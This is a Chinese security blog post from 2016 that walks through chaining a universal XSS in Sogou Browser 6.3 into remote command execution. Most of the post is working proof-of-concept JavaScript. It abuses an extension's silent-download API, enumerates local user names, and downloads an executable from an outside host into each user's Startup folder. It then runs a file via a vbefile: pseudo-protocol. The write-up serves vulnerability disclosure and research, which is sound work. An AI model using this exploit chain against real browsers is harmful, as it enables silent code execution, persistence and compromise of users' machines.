title: "[浏览器安全系列三] 搜狗浏览器从UXSS到远程命令执行"
date: 2016-10-06 10:57:48
tags: ["安全", "浏览器安全", "XSS"]

---

案例链接：http://www.wooyun.org/bugs/wooyun-2016-0213422

## 免责声明

本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!

### 0x00 首先是UXSS

具体见：https://bugs.chromium.org/p/chromium/issues/detail?id=569496

浏览器版本号：6.3.8.21279

### 0x01 既然可以UXSS，我们找个特权域

从漏洞 http://wooyun.org/bugs/wooyun-2010-0145023 我们可以知道搜狗浏览器的扩展有下载任意文件到任意位置的API！我们自己写一个恶意扩展，提交并通过审核的可能性基本为0。这个API这么好用，但又只能从：se-extension://域名下进行调用，好像很难构造吧。

```javascript
sogouExplorer.downloads.downloadSilently({
  url:"http://tmxk.org/img/r-c.png",
  filename:"dd.exe",
  path:"d:\",
  method:"GET"
})
```

我在想怎么利用上面的UXSS的时候，突发奇想的测试了一下，我们能不能打到se-extension://这个域名，于是进行一下测试。我找了一个搜狗浏览器安装时启用的默认扩展，找到其background.html的地址：`se-extension://ext238561744/background.html`。结果当然是没有那么容易，会提示如下的信息：

> Denying load of se-extension://ext238561744/background.html. Resources must be listed in the web_accessible_resources manifest key in order to be loaded by pages outside the extension.

![](http://ww1.sinaimg.cn/large/7184df6bgw1f8idldd42oj20hs0cstb1.jpg)

![](http://ww1.sinaimg.cn/large/7184df6bgw1f8idmtvo71j20ry0j0gou.jpg)

### 0x02 难道没法子？

我认真的读了两秒这个提示后，原来还允许开发者通过`web_accessible_resources`指定某些资源，从而实现在扩展外被访问！当然，我们就去试试运气去默认的扩展下找找看有没有吧。搜狗浏览器安装的插件在这个目录下：

```
C:\Users\Username\AppData\Roaming\SogouExplorer\Extension
```

grep一下，找到了一个插件，搜狗打假助手，`com.sogou.antiCrime`，其manifest.xml文件中有以下的内容：

![](http://ww1.sinaimg.cn/large/7184df6bgw1f8idowi21sj20n90h5465.jpg))

于是就把要打的域名地址换成了：

```
se-extension://ext238561744/jd/images/ac-logo.png
```

一开始我还觉得这是一个PNG图片，即使没有被拒绝访问，也应该用不了扩展的API吧。我本来是很怀疑能不能行的，正想放弃的时候，我还是觉得应该尝试一发。把PoC里的expolit.html里的f函数改一下，尝试下载一个文件到`c:\Users\`目录下。

备注：后来想想其实也对，因为图片在浏览器打开的时候浏览器用自动的使用img标签插入来显示图片。

```javascript
...

function f() {
  console.log("f()")
  if (++c1 == 2) {
    var x1 = x.contentWindow[0].frameElement.nextSibling;
    // x1.src = 'se-extension://ext238561744/background.html';         // Denied
    x1.src = 'se-extension://ext238561744/jd/images/ac-logo.png';
    try {
      while (x1.contentDocument) { ml(); }
    } catch(e) {
      x1.src = "javascript:if(location != 'about:blank') {console.log(location); sogouExplorer.downloads.downloadSilently({url:'http://127.0.0.1/test.js',filename:'test.js',path:'c:\\\\Users\\\\',method:'GET'});}"
    }
  }
}

...
```

![](http://ww1.sinaimg.cn/large/7184df6bgw1f8idw8oogbj20ru0ivgqz.jpg)

### 0x03 最终我们做到了！

上面下载好文件之后，我们可以直接使用伪协议来执行，在 http://wooyun.org/bugs/wooyun-2010-0177221 最新版依旧没有加个提示什么的。而且现在我们又扩展名`.js`了。直接可以执行。当然，我们也可以写到用户的启动目录中，至于怎么拿到用户名，这个 http://wooyun.org/bugs/wooyun-2010-0176436 的漏洞都公开了，然后好像什么修复工作都没有做。

```javascript
location.href="vbefile:/../../../../../../Users/test.js"
```

获取用户名的过程：用户访问open.html，跳转到data:域下
```javascript
window.location.href = "data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHA6Ly8xMjcuMC4wLjEvZXZpbC5qcyc+PC9zY3JpcHQ+"
```
其中base64解密后内容为：

```html
<script src='http://127.0.0.1/evil.js'></script>
```

evil.js在data域下执行，可以获取到用户名列表，然后再跳转到需要写calc.exe到启动目录的页面中，完成写入操作！

```javascript
function getUsers(data) {
  var users = data.match(/<script>addRow\("([^"]+)"/g) || [];
  var currentUser=[];
  for(var i = 0; i < users.length; i++) {
    var user = (users[i].match(/<script>addRow\("([^"]+)"/) || ["", ""])[1];
    if(["..", "All Users", "Default", "Default User", "Public", "UpdatusUser", "desktop.ini"].indexOf(user) == -1) {
      currentUser.push(user);
    }
  }
  
  console.log(currentUser);
  return currentUser;
}

window.external.extension("getRecommendSidebarExts", "file:///C:/Users/", function () {
  var data = JSON.parse(arguments[0]);
  if (data.success != true)
    return;

  location.href = 'http://127.0.0.1/exploit.html?users=' + getUsers(data.data);
});

```

写文件到启动目录下：
```javascript
function f() {
  console.log("f()")
  if (++c1 == 2) {
    var users = top.location.search.replace('?users=').split(',');

    var x1 = x.contentWindow[0].frameElement.nextSibling;
    // x1.src = 'se-extension://ext238561744/background.html';         // Denied
    x1.src = 'se-extension://ext238561744/jd/images/ac-logo.png';
    try {
      while (x1.contentDocument) { ml(); }
    } catch(e) {
      var users_str = '';
      for (var i = 0; i < users.length; ++i) {
        users_str += ('"' + users[i] + '"');
        if (i != users.length - 1)
          users_str += ',';
      }
      x1.src = "javascript:if(location != 'about:blank') { var users=[" + users_str + "]; for (var i = 0; i < users.length; ++i) sogouExplorer.downloads.downloadSilently({url:'http://a.zhchbin.xyz/calc.exe',filename:'calc.exe',path:'C:\\\\Users\\\\' + users[i] + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\',method:'GET'});}"
    }
  }
}

```


录个用伪协议执行的GIF

![](http://ww4.sinaimg.cn/large/7184df6bgw1f8idxtyw70g20sg0j2do4.gif)
